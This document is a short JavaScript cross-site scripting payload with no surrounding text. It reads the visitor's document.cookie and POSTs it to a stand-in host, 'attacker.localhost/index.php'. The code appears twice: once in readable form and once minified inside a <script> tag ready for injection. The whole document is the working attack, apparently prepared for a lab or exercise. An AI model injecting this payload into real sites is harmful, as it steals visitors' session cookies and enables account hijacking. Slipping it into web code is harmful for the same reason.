var http = new XMLHttpRequest();
var url = "http://attacker.localhost/index.php";
var params = "cookies=".concat(document.cookie);
http.open("POST", url, true);

http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http.setRequestHeader("Content-length", params.length);
http.setRequestHeader("Connection", "close");
http.send(params);


<script>var http=new XMLHttpRequest,url="http://attacker.localhost/index.php",params="cookies=".concat(document.cookie);http.open("POST",url,!0),http.setRequestHeader("Content-type","application/x-www-form-urlencoded"),http.setRequestHeader("Content-length",params.length),http.setRequestHeader("Connection","close"),http.send(params);</script>
